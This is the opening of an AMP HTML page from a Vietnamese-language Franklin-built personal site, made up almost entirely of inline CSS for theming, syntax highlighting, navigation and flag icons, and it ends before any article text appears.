<!doctypehtml><html prefix="og: https://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#"amp lang=vi><script async src=https://cdn.ampproject.org/v0.js></script><meta charset=utf-8><meta content=width=device-width,minimum-scale=1,initial-scale=1 name=viewport><style amp-custom>.hljs{display:block;font-size:14px;line-height:1.45em;overflow-x:auto;padding:.5em;color:var(--text-color);background:var(--block-background)}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:var(--text-color);font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:var(--text-color);font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}:root{--block-background: var(--accent2);--small: 14px;--normal: 19px;--text-color: hsv(0, 0%, 20%)}.franklin-content .row{display:block}.franklin-content .left{float:left;margin-right:15px}.franklin-content .right{float:right}.franklin-content .container img{width:auto;padding-left:0;border-radius:10px}.franklin-content .footnote{position:relative;top:-.5em;font-size:70%}.franklin-toc li{margin:.6rem 0}.franklin-content{position:relative;padding-left:12.5%;padding-right:12.5%;line-height:1.35em}@media (min-width: 940px){.franklin-content{width:705px;margin-left:auto;margin-right:auto}}@media (max-width: 480px){.franklin-content{padding-left:6%;padding-right:6%}}.franklin-content h1{font-size:24px}.franklin-content h2{font-size:22px}.franklin-content h3{font-size:20px}.franklin-content h1,h2,h3,h4,h5,h6{text-align:left}.franklin-content h1{padding-bottom:.5em;border-bottom:3px double lightgrey;margin-top:1.5em;margin-bottom:1em}.franklin-content h2{padding-bottom:.3em;border-bottom:1px solid lightgrey;margin-top:2em;margin-bottom:1em}.franklin-content h1 a{color:inherit}.franklin-content h1 a:hover{text-decoration:none}.franklin-content h2 a{color:inherit}.franklin-content h2 a:hover{text-decoration:none}.franklin-content h3 a{color:inherit}.franklin-content h3 a:hover{text-decoration:none}.franklin-content h4 a{color:inherit}.franklin-content h4 a:hover{text-decoration:none}.franklin-content h5 a{color:inherit}.franklin-content h5 a:hover{text-decoration:none}.franklin-content h6 a{color:inherit}.franklin-content h6 a:hover{text-decoration:none}.franklin-content table{margin-left:auto;margin-right:auto;border-collapse:collapse;text-align:center}.franklin-content table *{line-height:.75rem}.franklin-toc ol ol{list-style-type:lower-alpha}.franklin-content th,td{font-size:var(--small);padding:10px;border:1px solid black}.franklin-content blockquote{background:var(--block-background);border-left:7px solid #a8a8a8;margin:1.5em 10px;padding:.5em 10px;font-style:italic}.franklin-content blockquote p{display:inline}.franklin-content li p{margin:10px 0}.franklin-content a{color:var(--alt2);text-decoration:none}.franklin-content a:hover{text-decoration:underline}.franklin-content .eqref a{color:green}.franklin-content .bibref a{color:green}.franklin-content sup{font-size:70%;vertical-align:super;line-height:0}.franklin-content sup a.fnref,.franklin-content td.fndef-backref a{overflow:visible;display:initial;padding-bottom:.3rem;padding-top:.2rem}.franklin-content table.fndef{margin:0 0 10px}.franklin-content .fndef tr,td{padding:0;border:0;text-align:left}.franklin-content .fndef tr{border-left:2px solid lightgray}.franklin-content .fndef td.fndef-backref{vertical-align:top;font-size:70%;padding-left:5px}.franklin-content .fndef td.fndef-content{font-size:80%;padding-left:10px;width:100%}.franklin-content img{width:70%;text-align:center;padding-left:10%}.franklin-content .img-small img{width:50%;text-align:center;padding-left:20%}body{counter-reset:eqnum}.katex{font-size:1em}.katex-display .katex{display:inline-block;white-space:normal}.katex-display:after{counter-increment:eqnum;content:"(" counter(eqnum) ")";position:relative;float:right;padding-right:5px}code{background-color:var(--block-background);padding:.1em .2em;border-radius:2px;font-size:var(--small);overflow:auto}code.plaintext{display:block}.scrollbox{width:10em;height:10em;overflow:auto;visibility:hidden}.scrollbox-content,.scrollbox:hover,.scrollbox:focus{visibility:visible}.scrollbox_delayed{transition:visibility .2s}.scrollbox_delayed:hover{transition:visibility 0s .2s}.hljs{font-size:var(--small);line-height:1.35em;border-radius:10px}.hljs-meta,.hljs-metas,.hljs-metap{font-weight:bold}.hljs-meta{color:#19b333}.hljs-metas{color:red}.hljs-metap{color:#3383e7}.franklin-content .colbox-blue{background-color:#eef3f5;padding:5px 10px;margin-left:5px;margin-top:5px;margin-bottom:5px;border-radius:0 10px 10px 0;border-left:5px solid #4c9cf1}body.light{--accent: #3152ff;--accent2: #5a61ae;--accent3: #651b00;--alt: #ae6600;--alt2: #9e6c47;--alt3: #7f4200;--alt4: #ffbebe;--background-color: #ffebee;--foreground-color: #1c0005;--block-background: #423833;--red: #e42a2f;--yellow: #917329;--green: #29892d}@media (prefers-color-scheme: light){body{--accent: #3152ff;--accent2: #5a61ae;--accent3: #651b00;--alt: #ae6600;--alt2: #9e6c47;--alt3: #7f4200;--background-color: #ffebee;--foreground-color: #1c0005;--block-background: #423833;--red: #e42a2f;--yellow: #917329;--green: #29892d}}body.dark{--accent: #72e200;--accent2: #add3a0;--accent3: #7a9eff;--alt: #8abeff;--alt2: #836bd1;--alt3: #a090de;--background-color: #001d49;--foreground-color: #dae2ff;--block-background: #011627;--red: #e42a2f;--yellow: #917329;--green: #29892d}@media (prefers-color-scheme: dark){body{--accent: #72e200;--accent2: #add3a0;--accent3: #7a9eff;--alt: #8abeff;--alt2: #836bd1;--alt3: #a090de;--background-color: #001d49;--foreground-color: #dae2ff;--block-background: #011627;--red: #e42a2f;--yellow: #917329;--green: #29892d}}body{background:var(--background-color);font-style:var(--accent);font-family:Helvetica;padding:0 .5rem;line-height:2rem;color:var(--accent3);max-width:1280px;min-height:720px;margin:auto;min-width:320px}a{color:var(--accent)}a:visited{color:var(--accent2)}.author__place .author__bio{font-size:1rem}.franklin-content blockquote{border-left-color:var(--accent)}.franklin-content{color:var(--foreground-color)}.franklin-content #title a,.franklin-content .header-anchor{padding:.5rem;line-height:100%}.franklin-content a{outline-style:outset;outline-width:1px;padding:0 .1rem;margin:0 .1rem;outline-color:var(--alt2)}.franklin-content img{width:auto;text-align:center;padding:0}body>div>h1{text-align:center;color:var(--accent2)}body>div #title,body>div #page-description{text-align:center}.page__footer{margin-top:1rem;padding-top:1rem}.franklin-content .intro{font-size:1.2rem;text-align:left}.franklin-content .intro ul{list-style-type:none;font-size:1.1rem;font-style:italic}.franklin-content .intro a{font-variant:small-caps;padding-bottom:.2rem;font-size:1.4rem;font-style:normal}.franklin-content .intro .icon{padding:0 .2rem;font-size:1rem}.franklin-content .active-projects ul h4{font-size:1.5rem;font-variant:small-caps;font-style:normal;margin:.2rem}.franklin-content h3{font-size:.9rem}.posts_list h3{text-align:center}.svg-inline--fa.icon{width:1rem}.masthead__menu{height:4rem;line-height:4rem;padding:10px 0;position:relative}.site-title{float:left;font-weight:bold;width:15rem;font-size:1.5rem;text-decoration:none;color:var(--accent)}.site-title:visited{color:var(--accent)}#site-nav{float:right;font-size:1.5rem;font-family:Courier New;font-weight:bold;position:absolute;right:0}#site-nav .horiz ul{list-style-type:none;line-height:4rem;height:4rem;margin:0}#site-nav .horiz ul>li{padding:0 .5rem;box-shadow:.25rem -.025rem .05rem var(--alt)}#site-nav .horiz ul>li{float:left;border-top:0;border-bottom:0;border-left:0;border-radius:50% 25% 25% 50%}#site-nav ul>li>a,#site-nav ul>li>button{color:var(--alt);display:inline-block}#site-nav .menu-icons{position:relative;padding:0 .2rem}#site-nav{display:block;width:auto;height:auto}.masthead__inner-wrap{display:block;width:100%;padding:10px 0;height:inherit}.author__avatar>img{width:4em;height:4em;border-radius:50%;object-fit:cover;border-width:.1rem;border-color:var(--accent3);border-style:solid;box-shadow:.1rem .06rem var(--accent3),-.05rem -.025rem .2rem var(--accent3)}#site-nav a:link{text-decoration:none}#site-nav .vert,#site-nav .ham{display:none}.author__avatar{object-fit:contain;float:left}.author__name{display:none}.author__place{font-size:.65em}.author__wrap>ul{float:left;height:inherit;margin:0;padding:0 10px}.author__wrap>ul>li{position:relative;float:left;list-style-type:none;font-size:1rem;padding:0 .2rem;text-align:center}.page__footer ul>li{list-style-type:none}ul>li.author__urls{font-size:2rem}ul>li.author__urls a:visited{color:var(--accent)}ul>li.author__urls a:hover{filter:drop-shadow(.1rem .1rem 0 var(--accent2)) brightness(1.5);filter:brightness(1.5);transition-property:-moz-filter,-ms-filter,-o-filter,-webkit-filter,filter;transition-duration:.2s}ul>li.author__place a{color:var(--accent3);text-decoration:none;text-shadow:0 0 .01rem var(--alt2)}.author__wrap .author__avatar{float:left}.langs-dropdown-wrapper{cursor:pointer}.langs-dropdown-content{display:none;text-align:left}.langs-dropdown-content.show{display:block}.langs-dropdown-content a{display:block}.menu-lang-btn:before{border-radius:25% 25% 25% 50%}@media (max-width: 680px){.lang-link{height:3rem}}.lang-link .flag-icon,.lang-link .flag{position:absolute;left:1rem;margin-top:.65rem}#site-nav .langs-dropdown-menu{left:1.5rem;position:relative;top:1rem}#site-nav .langs-dropdown-menu .lang-list{font-size:1rem;line-height:2rem;overflow-x:hidden;height:20rem;position:absolute;overflow-y:scroll;right:1rem;scrollbar-width:thin;border:solid;border-radius:25%;border-width:0 0 0 .25rem;transition:height;padding-left:3rem}#site-nav .langs-dropdown-menu .lang-link:hover{color:var(--foreground-color)}.lang-list{background-color:var(--background-color)}#site-nav ul>li>button{background:inherit;border:inherit;font-size:inherit;font-family:inherit;font-weight:inherit;padding:inherit;margin:inherit;list-style-type:inherit;line-height:inherit;height:inherit}.page-foot{font-size:.7em;line-height:1.25em;text-align:right;display:inline-block;width:100%}.franklin-content{padding:0 0 2rem;z-index:0}.franklin-content,.tag-content{padding-top:1rem}.author__bio li{list-style:none}.author__bio li p{margin:0;padding:0}#tag-name{font-size:1.5rem;padding:.5rem;font-weight:bold;font-variant:small-caps}#tag_title{font-variant:small-caps}#tag_title .wrap{text-align:left}#tag_title>.wrap>*{display:inline-block;text-align:left}#tag_cloud{font-weight:bold}.posts_list.franklin-content>ul{list-style-type:"> "}.posts_list.franklin-content>.title{font-variant:small-caps}.posts_list.franklin-content>.title>h2{font-size:1rem;font-style:italic}.posts_list.franklin-content>.title>h2,.posts_list.franklin-content>.title>a>h1{display:inline}.posts_list.franklin-content>ul>li{line-height:1.2rem;padding:.1rem}.posts_list.franklin-content>ul>li>p{padding:.1rem;margin:.1rem}.posts_list.franklin-content>.title>h2,.posts_list.franklin-content>.title{text-align:center;display:block;margin:1rem}.page__footer-links>ul>li>a{padding:.2rem;margin:.2rem}#tag_cloud>a{padding:.2rem;font-variant:small-caps;vertical-align:middle;margin:.3rem;display:inline-block;text-decoration:none;text-shadow:0 0 5rem white}#tag_cloud .icon{font-size:1rem;vertical-align:middle;margin-right:.2rem;margin-left:.2rem}#tag_cloud_wrapper{display:inline-block;width:100%;text-align:center}#post-tags-list{font-variant:small-caps;font-weight:bold}.media{font-size:1.5rem;line-height:2rem}#library .book-author{color:var(--accent2);font-size:.9rem;display:inline}.shows_list h3{font-size:1.5rem}a.imdb{padding:0 .5rem}#searchResults ul li{margin-bottom:1rem}.lunrSearchForm{margin-right:-.4rem;font-size:0;overflow:hidden}.lunrSearchForm .search-input{background:var(--background-color);color:var(--alt);border-width:.2rem;border:none;outline:none;border-radius:50% 25% 25% 50%;line-height:1.75rem;padding:.5rem 0 .5rem 2.25rem;width:7rem;position:relative;top:.5rem;font-family:"Courier New";font-weight:bold;font-size:1.5rem}.lunrSearchForm .search-input:focus{background:var(--block-background)}.lunrSearchForm .search-button{color:var(--alt);background:none;border:none;font-size:1.5rem;padding:.2rem .2rem .2rem 0;position:absolute;top:1rem;left:.75rem;z-index:1;cursor:pointer}.lunrSearchForm .search-button:focus{color:var(--accent)}@media (min-width: 680px) and (max-width: 1300px){.lunrSearchForm .search-input{font-size:1rem;padding-left:2.75rem;width:4.5rem;border-radius:50% 100% 100% 50%}}@media (max-width: 680px){.lunrSearchForm{display:block;width:28rem}.lunrSearch{position:absolute;top:-4rem;display:block;left:0;width:calc(2rem + 90%)}.lunrSearch .search-input{width:26rem}}@media (max-width: 480px){.lunrSearchForm .search-input{width:18rem;left:-4rem}}.result-title a{text-decoration:none}.result-title a:hover{text-decoration:underline}.result-preview{color:gray}.resultCount{color:gray}.result-query{font-weight:bold}.lunrSearchForm{margin-top:1em}footer>*{float:left}footer a{text-decoration:underline dotted}footer ul.author__wrap>li{float:left;padding:0 .2rem}footer ul.author__wrap>li a{line-height:2rem;height:inherit;display:block}footer ul.author__wrap{float:right;margin:0}footer .page__footer-copyright{margin:0}footer .page__footer-links{margin:0 .2rem 0 .4rem}footer .page__footer-links ul{display:inline;margin:0 .4rem 0 0;padding:0}footer .page__footer-links li{display:inline}@media (min-width: 680px){#tag-name,.tag-desc{text-align:left}}@media (min-width: 680px) and (max-width: 1300px){body{max-width:640px;min-height:320px}#site-nav{position:relative;z-index:1}#site-nav .ham:hover{cursor:pointer}#site-nav .ham{outline:none}#site-nav .ham,#site-nav .ham-icon{display:block;height:3rem;line-height:3rem;position:absolute;right:0;top:0;text-align:right;background:transparent;border:none;font-size:3rem;color:var(--accent)}#site-nav .horiz{display:none}#site-nav .vert{display:block;float:none;position:absolute;right:0;top:3rem;width:9rem;padding-left:1rem;max-height:0rem;overflow:hidden;filter:blur(1rem);transition:max-height .33s ease-in,filter .33s ease-in}#site-nav .vert ul{margin:0;padding:10px 0}#site-nav .vert ul>li{width:100%;text-align:center;border-radius:25% 50% 50% 25%;adding:.5rem 1rem;box-shadow:-.25rem 0 .05rem var(--alt)}}@media (max-width: 680px){.masthead,.masthead__inner-wrap,.masthead__menu{display:block}.site-title{float:none;width:100%;display:block;text-align:center}.author__wrap{float:none;display:block;width:100%;height:4.4rem;text-align:center}.author__wrap ul{width:auto;float:none;padding:0;display:inline-block}#tag-name,.tag-desc{text-align:center}#site-nav{float:none;padding:10px 0;position:relative;top:4rem}#site-nav ul li{float:none}.horiz{text-align:center}#site-nav ul{display:inline-block;padding:0}.masthead{height:14rem}.page__footer{width:100%;display:block}.page__footer{text-align:center}footer{display:inline-block;text-align:center}footer>*{display:inline-block;float:none}footer ul.author__wrap{float:none}footer .author__urls.social-icons{font-size:1rem}.page-foot .copyright{display:inline-block}}@media (max-width: 480px){.masthead{height:30rem}#site-nav{top:5rem}#site-nav .horiz ul{width:100%}#site-nav .horiz ul>li{width:calc(100% - 2rem);float:none}}@media (min-width: 480px) and (max-width: 680px){.masthead{height:20rem}}@media (max-width: 680px){body{overflow-x:hidden}#site-nav{z-index:1}#site-nav .horiz ul>li{float:none;top:-4rem;position:relative;margin-top:1rem;margin-bottom:0}footer ul.author__wrap{margin-top:1rem;text-align:center;margin-left:0;padding-left:0}footer ul.author__wrap>li{float:none;display:inline-block}.page__footer{margin-top:3.5rem}}.site-title{-webkit-backface-visibility:hidden;backface-visibility:hidden;font-size:1.5rem;font-family:"VT323",monospace,sans-serif;color:var(--accent2);-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.site-title:after{content:"​";position:relative;padding-right:.5em;border-right:.5em solid var(--accent);white-space:nowrap;-webkit-animation:chars 5.52s linear 1s forwards,cursor 1s 3;animation:chars 5.52s linear 1s forwards,cursor 1s 3}.hvr-buzz-out{display:inline-block;vertical-align:middle;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px #0000}.hvr-buzz-out:hover,.hvr-buzz-out:focus,.hvr-buzz-out:active{-webkit-animation-name:hvr-buzz-out;animation-name:hvr-buzz-out;-webkit-animation-duration:.75s;animation-duration:.75s;-webkit-animation-timing-function:linear;animation-timing-function:linear;-webkit-animation-iteration-count:1;animation-iteration-count:1}.franklin-content a{display:inline-block;vertical-align:middle;text-decoration:none;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative;overflow:hidden}.franklin-content a:before{content:"";position:absolute;z-index:-1;left:51%;right:51%;bottom:0;background:var(--accent);height:4px;-webkit-transition-property:left,right;transition-property:left,right;-webkit-transition-duration:.3s;transition-duration:.3s;-webkit-transition-timing-function:ease-out;transition-timing-function:ease-out}.franklin-content a:hover:before,.franklin-content a:focus:before,.franklin-content a:active:before{left:0;right:0}.hvr-outline-in{display:inline-block;vertical-align:middle;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative}.horiz .hvr-outline-in:before{border-radius:50% 25% 25% 50%;right:-.25rem}.vert .hvr-outline-in:before{border-radius:25% 50% 50% 25%;left:-.25rem}.hvr-outline-in:before{pointer-events:none;content:"";position:absolute;border:var(--alt) solid .25rem;top:0;bottom:0;left:0;opacity:0;-webkit-transition-duration:.2s;transition-duration:.2s;-webkit-transition-property:top,right,bottom,left;transition-property:top,right,bottom,left}.horiz .hvr-outline-in:hover:before,.horiz .hvr-outline-in:focus:before,.horiz .hvr-outline-in:active:before{top:-.5rem;right:-.5rem;bottom:-.5rem;left:0;opacity:1}.vert .hvr-outline-in:hover:before,.vert .hvr-outline-in:focus:before,.vert .hvr-outline-in:active:before{top:-.5rem;right:0;bottom:-.5rem;left:-.5rem;opacity:1}#site-nav .vert:before{background-color:var(--background-color);filter:blur(.25rem);content:"";height:100%;width:100%;position:absolute}.author__avatar{background-color:transparent;perspective:1000px}.masthead__menu ul li.author__avatar img{transition:transform .8s;transform-style:preserve-3d}.masthead__menu li.author__avatar:hover img{transform:rotateY(180deg);cursor:pointer}body.light .hljs{display:block;overflow-x:auto;padding:.5em;color:#000;background:#f8f8ff}body.light .hljs-comment,body.light .hljs-quote{color:#408080;font-style:italic}body.light .hljs-keyword,body.light .hljs-literal,body.light .hljs-selector-tag,body.light .hljs-subst{color:#954121}body.light .hljs-number{color:#40a070}body.light .hljs-doctag,body.light .hljs-string{color:#219161}body.light .hljs-section,body.light .hljs-selector-class,body.light .hljs-selector-id,body.light .hljs-type{color:#19469d}body.light .hljs-params{color:#00f}body.light .hljs-title{color:#458;font-weight:700}body.light .hljs-attribute,body.light .hljs-name,body.light .hljs-tag{color:navy;font-weight:400}body.light .hljs-template-variable,body.light .hljs-variable{color:teal}body.light .hljs-link,body.light .hljs-regexp{color:#b68}body.light .hljs-bullet,body.light .hljs-symbol{color:#990073}body.light .hljs-built_in,body.light .hljs-builtin-name{color:#0086b3}body.light .hljs-meta{color:#999;font-weight:700}body.light .hljs-deletion{background:#fdd}body.light .hljs-addition{background:#dfd}body.light .hljs-emphasis{font-style:italic}body.light .hljs-strong{font-weight:700}.flag{display:inline-block;position:relative;width:16px;height:11px;background:url(/assets/flags.png) no-repeat}.flag.flag-gu{background-position:-96px -55px}.flag.flag-mn{background-position:-208px -88px}.flag.flag-va{background-position:-48px -154px}.flag.flag-tibet{background-position:-32px -143px}.flag.flag-fo{background-position:-64px -44px}.flag.flag-th{background-position:-16px -143px}.flag.flag-tr{background-position:-144px -143px}.flag.flag-tl{background-position:-80px -143px}.flag.flag-kz{background-position:-144px -77px}.flag.flag-zm{background-position:-16px -165px}.flag.flag-uz{background-position:-32px -154px}.flag.flag-dk{background-position:-64px -33px}.flag.flag-scotland{background-position:-176px -121px}.flag.flag-gi{background-position:-224px -44px}.flag.flag-gy{background-position:-128px -55px}.flag.flag-bj{background-position:-112px -11px}.flag.flag-fr{background-position:-80px -44px}.flag.flag-mo{background-position:-224px -88px}.flag.flag-ir{background-position:-112px -66px}.flag.flag-io{background-position:-80px -66px}.flag.flag-tm{background-position:-96px -143px}.flag.flag-ch{background-position:-96px -22px}.flag.flag-mt{background-position:-32px -99px}.flag.flag-nl{background-position:-240px -99px}.flag.flag-gp{background-position:-16px -55px}.flag.flag-im{background-position:-48px -66px}.flag.flag-tv{background-position:-176px -143px}.flag.flag-mu{background-position:-48px -99px}.flag.flag-pe{background-position:-96px -110px}.flag.flag-vi{background-position:-112px -154px}.flag.flag-hn{background-position:-176px -55px}.flag.flag-ss{background-position:-128px -132px}.flag.flag-ae{background-position:-16px 0}.flag.flag-td{background-position:-240px -132px}.flag.flag-pw{background-position:0 -121px}.flag.flag-nu{background-position:-32px -110px}.flag.flag-bt{background-position:-208px -11px}.flag.flag-ms{background-position:-16px -99px}.flag.flag-cv{background-position:-240px -22px}.flag.flag-es{background-position:-224px -33px}.flag.flag-mh{background-position:-144px -88px}.flag.flag-la{background-position:-160px -77px}.flag.flag-vn{background-position:-128px -154px}.flag.flag-py{background-position:-16px -121px}.flag.flag-br{background-position:-176px -11px}.flag.flag-ye{background-position:-224px -154px}.flag.flag-ie{background-position:0 -66px}.flag.flag-gh{background-position:-208px -44px}.flag.flag-cg{background-position:-80px -22px}.flag.flag-cu{background-position:-224px -22px}.flag.flag-hu{background-position:-224px -55px}.flag.flag-sg{background-position:-224px -121px}.flag.flag-at{background-position:-176px 0}.flag.flag-lk{background-position:-224px -77px}.flag.flag-vu{background-position:-144px -154px}.flag.flag-bo{background-position:-160px -11px}.flag.flag-jo{background-position:-208px -66px}.flag.flag-er{background-position:-208px -33px}.flag.flag-za{background-position:-256px -154px}.flag.flag-rs{background-position:-80px -121px}.flag.flag-nr{background-position:-16px -110px}.flag.flag-ls{background-position:-256px -77px}.flag.flag-jm{background-position:-192px -66px}.flag.flag-tz{background-position:-208px -143px}.flag.flag-ki{background-position:-16px -77px}.flag.flag-sj{background-position:0 -132px}.flag.flag-cz{background-position:-16px -33px}.flag.flag-pg{background-position:-128px -110px}.flag.flag-lv{background-position:-32px -88px}.flag.flag-do{background-position:-96px -33px}.flag.flag-lu{background-position:-16px -88px}.flag.flag-no{background-position:-256px -99px}.flag.flag-kw{background-position:-112px -77px}.flag.flag-mx{background-position:-96px -99px}.flag.flag-yt{background-position:-240px -154px}.flag.flag-ly{background-position:-48px -88px}.flag.flag-cy{background-position:0 -33px}.flag.flag-ph{background-position:-144px -110px}.flag.flag-my{background-position:-112px -99px}.flag.flag-sm{background-position:-48px -132px}.flag.flag-et{background-position:-240px -33px}.flag.flag-ru{background-position:-96px -121px}.flag.flag-tj{background-position:-48px -143px}.flag.flag-ai{background-position:-64px 0}.flag.flag-pl{background-position:-176px -110px}.flag.flag-kp{background-position:-64px -77px}.flag.flag-uy{background-position:-16px -154px}.flag.flag-gb{background-position:-112px -44px}.flag.flag-gs{background-position:-64px -55px}.flag.flag-kurdistan{background-position:-96px -77px}.flag.flag-rw{background-position:-112px -121px}.flag.flag-ec{background-position:-128px -33px}.flag.flag-mm{background-position:-192px -88px}.flag.flag-pa{background-position:-80px -110px}.flag.flag-wales{background-position:-160px -154px}.flag.flag-kg{background-position:-256px -66px}.flag.flag-ve{background-position:-80px -154px}.flag.flag-tk{background-position:-64px -143px}.flag.flag-ca{background-position:-16px -22px}.flag.flag-is{background-position:-128px -66px}.flag.flag-ke{background-position:-240px -66px}.flag.flag-ro{background-position:-64px -121px}.flag.flag-gq{background-position:-32px -55px}.flag.flag-pt{background-position:-256px -110px}.flag.flag-tf{background-position:-256px -132px}.flag.flag-ad{background-position:0 0}.flag.flag-sk{background-position:-16px -132px}.flag.flag-pm{background-position:-192px -110px}.flag.flag-om{background-position:-64px -110px}.flag.flag-an{background-position:-112px 0}.flag.flag-ws{background-position:-192px -154px}.flag.flag-sh{background-position:-240px -121px}.flag.flag-mp{background-position:-240px -88px}.flag.flag-gt{background-position:-80px -55px}.flag.flag-cf{background-position:-64px -22px}.flag.flag-zanzibar{background-position:0 -165px}.flag.flag-mw{background-position:-80px -99px}.flag.flag-catalonia{background-position:-32px -22px}.flag.flag-ug{background-position:-240px -143px}.flag.flag-je{background-position:-176px -66px}.flag.flag-km{background-position:-32px -77px}.flag.flag-in{background-position:-64px -66px}.flag.flag-bf{background-position:-48px -11px}.flag.flag-mc{background-position:-80px -88px}.flag.flag-sy{background-position:-192px -132px}.flag.flag-sn{background-position:-64px -132px}.flag.flag-kr{background-position:-80px -77px}.flag.flag-eu{background-position:-256px -33px}.flag.flag-bn{background-position:-144px -11px}.flag.flag-st{background-position:-144px -132px}.flag.flag-england{background-position:-192px -33px}.flag.flag-lc{background-position:-192px -77px}.flag.flag-dm{background-position:-80px -33px}.flag.flag-be{background-position:-32px -11px}.flag.flag-ni{background-position:-224px -99px}.flag.flag-ua{background-position:-224px -143px}.flag.flag-mz{background-position:-128px -99px}.flag.flag-pf{background-position:-112px -110px}.flag.flag-tn{background-position:-112px -143px}.flag.flag-ee{background-position:-144px -33px}.flag.flag-xk{background-position:-208px -154px}.flag.flag-sx{background-position:-176px -132px}.flag.flag-sd{background-position:-192px -121px}.flag.flag-gd{background-position:-128px -44px}.flag.flag-ci{background-position:-112px -22px}.flag.flag-sz{background-position:-208px -132px}.flag.flag-cl{background-position:-144px -22px}.flag.flag-fi{background-position:0 -44px}.flag.flag-ga{background-position:-96px -44px}.flag.flag-jp{background-position:-224px -66px}.flag.flag-de{background-position:-32px -33px}.flag.flag-np{background-position:0 -110px}.flag.flag-re{background-position:-48px -121px}.flag.flag-bg{background-position:-64px -11px}.flag.flag-sc{background-position:-160px -121px}.flag.flag-ng{background-position:-208px -99px}.flag.flag-qa{background-position:-32px -121px}.flag.flag-mk{background-position:-160px -88px}.flag.flag-aw{background-position:-208px 0}.flag.flag-kn{background-position:-48px -77px}.flag.flag-al{background-position:-80px 0}.flag.flag-bw{background-position:-240px -11px}.flag.flag-um{background-position:-256px -143px}.flag.flag-ky{background-position:-128px -77px}.flag.flag-tt{background-position:-160px -143px}.flag.flag-so{background-position:-80px -132px}.flag.flag-lt{background-position:0 -88px}.flag.flag-by{background-position:-256px -11px}.flag.flag-bb{background-position:0 -11px}.flag.flag-us{background-position:0 -154px}.flag.flag-md{background-position:-96px -88px}.flag.flag-ag{background-position:-48px 0}.flag.flag-hm{background-position:-160px -55px}.flag.flag-as{background-position:-160px 0}.flag.flag-eg{background-position:-160px -33px}.flag.flag-sv{background-position:-160px -132px}.flag.flag-sl{background-position:-32px -132px}.flag.flag-fk{background-position:-32px -44px}.flag.flag-am{background-position:-96px 0}.flag.flag-ck{background-position:-128px -22px}.flag.flag-tw{background-position:-192px -143px}.flag.flag-kh{background-position:0 -77px}.flag.flag-to{background-position:-128px -143px}.flag.flag-se{background-position:-208px -121px}.flag.flag-cd{background-position:-48px -22px}.flag.flag-pn{background-position:-208px -110px}.flag.flag-gr{background-position:-48px -55px}.flag.flag-id{background-position:-256px -55px}.flag.flag-vc{background-position:-64px -154px}.flag.flag-somaliland{background-position:-96px -132px}.flag.flag-bi{background-position:-96px -11px}.flag.flag-pk{background-position:-160px -110px}.flag.flag-pr{background-position:-224px -110px}.flag.flag-bd{background-position:-16px -11px}.flag.flag-co{background-position:-192px -22px}.flag.flag-fm{background-position:-48px -44px}.flag.flag-bm{background-position:-128px -11px}.flag.flag-ar{background-position:-144px 0}.flag.flag-bv{background-position:-224px -11px}.flag.flag-sb{background-position:-144px -121px}.flag.flag-mq{background-position:-256px -88px}.flag.flag-eh{background-position:-176px -33px}.flag.flag-bh{background-position:-80px -11px}.flag.flag-it{background-position:-144px -66px}.flag.flag-hr{background-position:-192px -55px}.flag.flag-sa{background-position:-128px -121px}.flag.flag-mv{background-position:-64px -99px}.flag.flag-mg{background-position:-128px -88px}.flag.flag-dz{background-position:-112px -33px}.flag.flag-gg{background-position:-192px -44px}.flag.flag-gm{background-position:-256px -44px}.flag.flag-af{background-position:-32px 0}.flag.flag-li{background-position:-208px -77px}.flag.flag-sr{background-position:-112px -132px}.flag.flag-vg{background-position:-96px -154px}.flag.flag-cr{background-position:-208px -22px}.flag.flag-tc{background-position:-224px -132px}.flag.flag-ao{background-position:-128px 0}.flag.flag-ma{background-position:-64px -88px}.flag.flag-mr{background-position:0 -99px}.flag.flag-gn{background-position:0 -55px}.flag.flag-ne{background-position:-176px -99px}.flag.flag-nf{background-position:-192px -99px}.flag.flag-wf{background-position:-176px -154px}.flag.flag-hk{background-position:-144px -55px}.flag.flag-gf{background-position:-160px -44px}.flag.flag-ps{background-position:-240px -110px}.flag.flag-ic{background-position:-240px -55px}.flag.flag-cw{background-position:-256px -22px}.flag.flag-ml{background-position:-176px -88px}.flag.flag-ax{background-position:-224px 0}.flag.flag-gl{background-position:-240px -44px}.flag.flag-dj{background-position:-48px -33px}.flag.flag-cn{background-position:-176px -22px}.flag.flag-ht{background-position:-208px -55px}.flag.flag-lr{background-position:-240px -77px}.flag.flag-tg{background-position:0 -143px}.flag.flag-ba{background-position:-256px 0}.flag.flag-ge{background-position:-144px -44px}.flag.flag-bz{background-position:0 -22px}.flag.flag-au{background-position:-192px 0}.flag.flag-iq{background-position:-96px -66px}.flag.flag-cm{background-position:-160px -22px}.flag.flag-gw{background-position:-112px -55px}.flag.flag-az{background-position:-240px 0}.flag.flag-na{background-position:-144px -99px}.flag.flag-fj{background-position:-16px -44px}.flag.flag-zw{background-position:-32px -165px}.flag.flag-bs{background-position:-192px -11px}.flag.flag-il{background-position:-16px -66px}.flag.flag-nz{background-position:-48px -110px}.flag.flag-me{background-position:-112px -88px}.flag.flag-si{background-position:-256px -121px}.flag.flag-nc{background-position:-160px -99px}.flag.flag-lb{background-position:-176px -77px}</style><style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal 